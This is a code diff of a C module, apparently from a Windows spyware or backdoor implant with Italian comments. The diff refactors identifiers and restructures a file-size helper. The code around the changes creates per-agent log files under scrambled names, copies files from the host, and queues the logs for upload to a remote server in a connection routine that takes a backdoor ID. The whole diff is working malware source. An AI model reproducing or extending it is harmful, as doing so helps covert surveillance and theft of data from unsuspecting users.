@@ -19,17 +19,17 @@
 
 typedef struct {
 	DWORD agent_tag;
-	HANDLE h_file;
+	HANDLE hFile;
 } LOG_ENTRY_STRUCT;
 
 typedef struct _log_list {
-	nanosec_time ftime;
+	NANOSEC_TIME ftime;
 	char *file_name;
 	DWORD size;
 	struct _log_list* next;
-} LOG_LIST_STRUCT;
+} LOG_LIST;
 
-LOG_LIST_STRUCT *log_list_head = NULL;
+LOG_LIST *log_list_head = NULL;
 
 //
 // Struttura dei log file
@@ -53,7 +53,7 @@ typedef struct _log_struct {
 LOG_ENTRY_STRUCT log_table[MAX_LOG_ENTRIES];
 
 // Dichiarato in SM_EventHandlers.h
-extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
+extern BOOL IsGreaterDate(NANOSEC_TIME *, NANOSEC_TIME *);
 extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);
 
 // Dichiarato in SM_ActionFunctions.h
@@ -71,26 +71,25 @@ extern BOOL IsDeepFreeze();
 #define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
 DWORD GetLogSize(char *path)
 {
-	DWORD hi_dim=0, lo_dim=0;
-	HANDLE hfile;
+	HANDLE hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		DWORD hi_dim = 0, lo_dim = 0;
+		lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
+		CloseHandle(hfile);
+		if (hi_dim == 0 && lo_dim != INVALID_FILE_SIZE)
+			return lo_dim;
+	}
 
-	hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-	if (hfile == INVALID_HANDLE_VALUE) 
-		return 0xFFFFFFFF;
-	lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
-	CloseHandle(hfile);
-	if (lo_dim == INVALID_FILE_SIZE || hi_dim>0)
-		return 0xFFFFFFFF;
-	return lo_dim;
+	return 0xFFFFFFFF;
 }
 
 // Inserisce un elemento nella lista dei log da spedire in ordine di tempo
-BOOL InsertLogList(LOG_LIST_STRUCT **log_list, WIN32_FIND_DATA *log_elem)
+BOOL InsertLogList(LOG_LIST **log_list, WIN32_FIND_DATA *log_elem)
 {
-	LOG_LIST_STRUCT *new_elem;
+	LOG_LIST *new_elem;
 
 	// Alloca e inizializza il nuovo elemento
-	if ( !(new_elem = (LOG_LIST_STRUCT *)malloc(sizeof(LOG_LIST_STRUCT))) )
+	if ( !(new_elem = (LOG_LIST *)malloc(sizeof(LOG_LIST))) )
 		return FALSE;
 	if ( !(new_elem->file_name = (char *)strdup(log_elem->cFileName)) ) {
 		SAFE_FREE(new_elem);
@@ -116,9 +115,9 @@ BOOL InsertLogList(LOG_LIST_STRUCT **log_list, WIN32_FIND_DATA *log_elem)
 }
 
 // Libera la lista dei log
-void FreeLogList(LOG_LIST_STRUCT **log_list)
+void FreeLogList(LOG_LIST **log_list)
 {
-	LOG_LIST_STRUCT *list_ptr, *tmp_ptr;
+	LOG_LIST *list_ptr, *tmp_ptr;
 	list_ptr = *log_list;
 	while(list_ptr) {
 		SAFE_FREE(list_ptr->file_name);
@@ -264,7 +263,7 @@ void LOG_InitSequentialLogs()
 	// Inizializza la tabella dei log
 	for (i=0; i<MAX_LOG_ENTRIES; i++) {
 		log_table[i].agent_tag = NO_TAG_ENTRY;
-		log_table[i].h_file = INVALID_HANDLE_VALUE;
+		log_table[i].hFile = INVALID_HANDLE_VALUE;
 	}
 }
 
@@ -453,7 +452,7 @@ BOOL LOG_InitAgentLog(DWORD agent_tag)
 				FNC(FlushFileBuffers)(h_file);
 			}
 			
-			log_table[i].h_file = h_file;
+			log_table[i].hFile = h_file;
 			log_table[i].agent_tag = agent_tag;
 			return TRUE;
 		}
@@ -471,8 +470,8 @@ void LOG_StopAgentLog(DWORD agent_tag)
 	for (i=0; i<MAX_LOG_ENTRIES; i++) 
 		if (log_table[i].agent_tag == agent_tag) {
 			log_table[i].agent_tag = NO_TAG_ENTRY;
-			CloseHandle(log_table[i].h_file);
-			log_table[i].h_file = INVALID_HANDLE_VALUE;
+			CloseHandle(log_table[i].hFile);
+			log_table[i].hFile = INVALID_HANDLE_VALUE;
 			return;
 		}
 }
@@ -536,7 +535,7 @@ BOOL LOG_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len)
 	// Cerca il TAG giusto
 	for (i=0; i<MAX_LOG_ENTRIES; i++) 
 		if (log_table[i].agent_tag == agent_tag) 
-			return Log_WriteFile(log_table[i].h_file, buff, buff_len);
+			return Log_WriteFile(log_table[i].hFile, buff, buff_len);
 
 	return FALSE;
 }
@@ -618,7 +617,7 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 	char log_wout_path[128];
 	char file_name[DLLNAMELEN];
 	char *scrambled_name;
-	FILETIME time_nanosec;
+	FILETIME ts;
 	DWORD out_len, dummy;
 	BYTE *log_header;
 	HANDLE hfile;
@@ -631,7 +630,7 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 		return INVALID_HANDLE_VALUE;
 
 	// Usa l'epoch per dare un nome univoco al file
-	FNC(GetSystemTimeAsFileTime)(&time_nanosec);	
+	FNC(GetSystemTimeAsFileTime)(&ts);	
 
 	// Fa piu' tentativi ogni volta cambiando il nome del file
 	// data la scarsa granularita' del systemtime
@@ -640,7 +639,7 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 		if (retry_count > MAX_FILE_RETRY_COUNT)
 			return INVALID_HANDLE_VALUE;
 
-		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", shared.log_active_queue, agent_tag, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%.8X%.8X.log", shared.log_active_queue, agent_tag, ts.dwHighDateTime, ts.dwLowDateTime);
 		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, shared.crypt_key[0], TRUE)) )
 			return INVALID_HANDLE_VALUE;	
 		HM_CompletePath(scrambled_name, file_name);
@@ -649,9 +648,9 @@ HANDLE Log_CreateFile(DWORD agent_tag, BYTE *additional_header, DWORD additional
 		hfile = FNC(CreateFileA)(file_name, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); 
 
 		// Incrementa di 1 il timestamp se deve riprovare
-		time_nanosec.dwLowDateTime++;
-		if (time_nanosec.dwLowDateTime == 0) // il riporto
-			time_nanosec.dwHighDateTime++;
+		ts.dwLowDateTime++;
+		if (ts.dwLowDateTime == 0) // il riporto
+			ts.dwHighDateTime++;
 	} while (hfile == INVALID_HANDLE_VALUE);
 
 	// Scrive l'header nel file
@@ -1004,7 +1003,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 	char dest_file_path[DLLNAMELEN];
 	char dest_file_mask[DLLNAMELEN];
 	char *scrambled_name;
-	nanosec_time src_date, dst_date;
+	NANOSEC_TIME src_date, dst_date;
 	FILETIME time_nanosec;
 	//SYSTEMTIME system_time;
 	WIN32_FIND_DATA ffdata;
@@ -1053,7 +1052,7 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD a
 	} else {
 		// ...altrimenti gli crea un nome col timestamp attuale
 		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
-		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
+		//FNC(SystemTimeToFileTime)(&system_time, &ts);	
 		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", shared.log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
 		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, shared.crypt_key[0], TRUE)) )
 			return FALSE;	
@@ -1355,7 +1354,7 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	char DirSpec[DLLNAMELEN];  
 	char *scrambled_search;
 	char search_mask[64];
-	LOG_LIST_STRUCT *log_list;
+	LOG_LIST *log_list;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	DWORD tmp_free_space;
 	DWORD log_count = 0;
@@ -1744,10 +1743,6 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 	}
 
 	// Seleziona il subtype
-	/*if (IsX64System()) 
-		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN64");		
-	else
-		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");*/
 	if (shared.is_demo_version)
 		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS-DEMO");		
 	else
